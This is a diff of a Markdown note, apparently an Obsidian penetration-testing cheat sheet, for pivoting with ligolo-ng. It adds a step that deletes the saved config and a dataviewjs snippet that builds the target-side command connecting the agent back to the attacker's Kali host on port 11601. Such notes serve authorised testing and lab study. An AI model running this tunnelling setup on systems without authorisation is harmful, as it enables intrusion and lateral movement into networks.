@@ -55,7 +55,7 @@ chmod +x agent
 ## 🔹 Step 3 — Create TUN Interface (Kali)
 
 ```
-sudo ip tuntap add user kali mode tun ligolo 
+sudo ip tuntap add user kali mode tun ligolo
 ```
 
 ```
@@ -102,14 +102,21 @@ Expected output:
 
 Leave this running.
 
+Reset Ligolo, delete saved config
+```
+rm ligolo-ng.yaml
+```
+
 ---
 
 ## 🔹 Step 5 — Start Agent (Target)
+```dataviewjs
+const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-```
-./agent -connect <KALI_IP>:11601 -ignore-cert
-```
+const command = `./agent.exe -connect ${KaliIP}:11601 -ignore-cert`;
 
+dv.paragraph("```bash\n" + command + "\n```");
+```
 > ❗ Must include **port**
 
 If restricted egress:
